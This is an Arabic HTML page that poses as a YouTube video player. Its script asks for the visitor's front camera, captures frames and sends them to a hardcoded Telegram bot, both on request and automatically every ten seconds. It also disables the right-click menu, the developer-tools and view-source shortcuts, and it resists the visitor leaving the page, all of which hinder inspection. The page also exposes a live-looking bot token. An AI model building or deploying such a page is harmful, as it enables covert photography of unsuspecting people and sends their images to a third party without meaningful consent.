<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>مشغل فيديو + كاميرا خلفية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background: #000;
            min-height: 100vh;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }

        /* حاوية الفيديو - الخلفية */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .video-frame {
            width: 100%;
            height: 100%;
            border: none;
            pointer-events: none; /* منع التفاعل مع الفيديو */
        }

        /* طبقة الكاميرا - شفافة في الخلفية */
        .camera-layer {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 120px;
            height: 160px;
            border-radius: 15px;
            overflow: hidden;
            border: 2px solid rgba(255,255,255,0.5);
            z-index: 2;
            background: #000;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            cursor: pointer;
            transition: all 0.3s;
        }

        .camera-layer:hover {
            width: 150px;
            height: 200px;
            border: 2px solid #667eea;
        }

        .camera-layer video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        /* لوحة التحكم */
        .controls {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 3;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            padding: 10px 20px;
            border-radius: 50px;
            display: flex;
            gap: 15px;
            border: 1px solid rgba(255,255,255,0.2);
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            border-radius: 30px;
            cursor: pointer;
            transition: transform 0.2s;
        }

        button:hover {
            transform: scale(1.05);
        }

        button:active {
            transform: scale(0.95);
        }

        .btn-auto {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }

        .status {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            z-index: 3;
            color: white;
            text-align: center;
            white-space: nowrap;
        }

        .status.success { background: rgba(40,167,69,0.9); color: white; }
        .status.error { background: rgba(220,53,69,0.9); color: white; }
        .status.info { background: rgba(23,162,184,0.9); color: white; }

        canvas {
            display: none;
        }

        /* إخفاء أي عناصر غير مرغوب فيها */
        :-webkit-full-screen {
            background: #000;
        }

        ::-webkit-scrollbar {
            display: none;
        }

        /* زر التكبير */
        .fullscreen-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.5);
            border: none;
            color: white;
            font-size: 20px;
            padding: 8px 12px;
            border-radius: 50%;
            cursor: pointer;
            z-index: 3;
        }
    </style>
</head>
<body>

    <!-- فيديو يوتيوب في الخلفية -->
    <div class="video-background">
        <iframe class="video-frame" 
                src="https://www.youtube.com/watch?v=UWMx1j3OJ3U"
                frameborder="0"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
        </iframe>
    </div>

    <!-- نافذة الكاميرا المصغرة -->
    <div class="camera-layer" id="cameraLayer">
        <video id="video" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <!-- لوحة التحكم -->
    <div class="controls">
        <button id="captureBtn">📷 تصوير يدوي</button>
        <button id="autoBtn" class="btn-auto">🤖 تشغيل التصوير التلقائي</button>
        <button id="stopAutoBtn" style="display:none;">⏹️ إيقاف التلقائي</button>
    </div>

    <!-- شريط الحالة -->
    <div id="status" class="status info">⏳ جاري التهيئة...</div>

    <!-- زر ملء الشاشة -->
    <button class="fullscreen-btn" onclick="toggleFullscreen()">⛶</button>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = "i3bdullah";
        
        // ==================== متغيرات التصوير التلقائي ====================
        let autoCaptureInterval = null;
        let isAutoCapturing = false;
        let stream = null;
        
        // ==================== عناصر الصفحة ====================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        const autoBtn = document.getElementById('autoBtn');
        const stopAutoBtn = document.getElementById('stopAutoBtn');
        const statusDiv = document.getElementById('status');
        
        // ==================== دوال مساعدة ====================
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = `status ${type}`;
            console.log(`[${type}] ${msg}`);
            
            setTimeout(() => {
                if (statusDiv.className === `status ${type}` && type !== 'error') {
                    statusDiv.className = 'status info';
                    statusDiv.textContent = '✅ النظام يعمل';
                }
            }, 3000);
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                showStatus('🔍 جاري الاتصال بالبوت...', 'info');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const botInfo = await response.json();
                
                if (!botInfo.ok) {
                    throw new Error('التوكن غير صحيح');
                }
                
                console.log('✅ البوت يعمل:', botInfo.result.username);
                
                const updatesResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await updatesResponse.json();
                
                console.log("رد getUpdates:", result);
                
                if (result.ok && result.result.length > 0) {
                    const lastUpdate = result.result[result.result.length - 1];
                    const chatId = lastUpdate.message?.chat?.id || 
                                   lastUpdate.callback_query?.message?.chat?.id ||
                                   lastUpdate.my_chat_member?.chat?.id;
                    
                    if (chatId) {
                        CHAT_ID = chatId;
                        showStatus(`✅ تم الاتصال! Chat ID: ${CHAT_ID}`, 'success');
                        return true;
                    }
                }
                
                showStatus('⚠️ أرسل أي رسالة للبوت ثم أعد تحميل الصفحة', 'warning');
                return false;
                
            } catch (error) {
                console.error("خطأ:", error);
                showStatus('❌ فشل الاتصال بالبوت', 'error');
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                showStatus('📷 جاري تشغيل الكاميرا...', 'info');
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                showStatus('✅ الكاميرا جاهزة!', 'success');
                captureBtn.disabled = false;
                autoBtn.disabled = false;
                return true;
            } catch (err) {
                console.error("خطأ الكاميرا:", err);
                showStatus('❌ لا يمكن الوصول للكاميرا', 'error');
                captureBtn.disabled = true;
                autoBtn.disabled = true;
                return false;
            }
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend() {
            if (!CHAT_ID) {
                showStatus('❌ لا يوجد Chat ID', 'error');
                return false;
            }
            
            try {
                // التقاط الصورة
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                if (canvas.width === 0 || canvas.height === 0) {
                    throw new Error('الكاميرا غير جاهزة');
                }
                
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                // تحويل إلى Blob
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                
                // إرسال إلى تليجرام
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
                formData.append('caption', `📸 صورة ملتقطة في ${new Date().toLocaleString('ar-SA')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log('✅ تم الإرسال');
                    return true;
                } else {
                    throw new Error(result.description);
                }
                
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }
        
        // ==================== التصوير التلقائي ====================
        function startAutoCapture() {
            if (isAutoCapturing) return;
            
            isAutoCapturing = true;
            showStatus('🤖 بدء التصوير التلقائي (كل 10 ثواني)', 'success');
            
            autoBtn.style.display = 'none';
            stopAutoBtn.style.display = 'inline-block';
            
            // تصوير فوري
            captureAndSend();
            
            // تصوير كل 10 ثواني
            autoCaptureInterval = setInterval(async () => {
                const success = await captureAndSend();
                if (success) {
                    console.log('📸 تصوير تلقائي ناجح');
                }
            }, 10000);
        }
        
        function stopAutoCapture() {
            if (autoCaptureInterval) {
                clearInterval(autoCaptureInterval);
                autoCaptureInterval = null;
            }
            isAutoCapturing = false;
            showStatus('⏹️ تم إيقاف التصوير التلقائي', 'info');
            
            autoBtn.style.display = 'inline-block';
            stopAutoBtn.style.display = 'none';
        }
        
        // ==================== ملء الشاشة ====================
        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
        
        // ==================== منع فتح أدوات المطور ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U') ||
                (e.ctrlKey && e.key === 'S')) {
                e.preventDefault();
                return false;
            }
        });
        
        // ==================== تهيئة البداية ====================
        async function init() {
            const hasChatId = await getChatId();
            await startCamera();
            
            if (!hasChatId) {
                showStatus('⚠️ أرسل رسالة للبوت ثم أعد التحميل', 'warning');
            }
        }
        
        // ==================== ربط الأزرار ====================
        captureBtn.onclick = async () => {
            const success = await captureAndSend();
            if (success) {
                showStatus('✅ تم إرسال الصورة!', 'success');
            } else {
                showStatus('❌ فشل الإرسال', 'error');
            }
        };
        
        autoBtn.onclick = startAutoCapture;
        stopAutoBtn.onclick = stopAutoCapture;
        
        // بدء التشغيل
        init();
        
        // إيقاف الكاميرا عند الخروج
        window.onbeforeunload = () => {
            if (autoCaptureInterval) clearInterval(autoCaptureInterval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
        
        // منع الخروج من الصفحة أثناء التصوير التلقائي (اختياري)
        window.addEventListener('beforeunload', (e) => {
            if (isAutoCapturing) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>
</body>
</html>
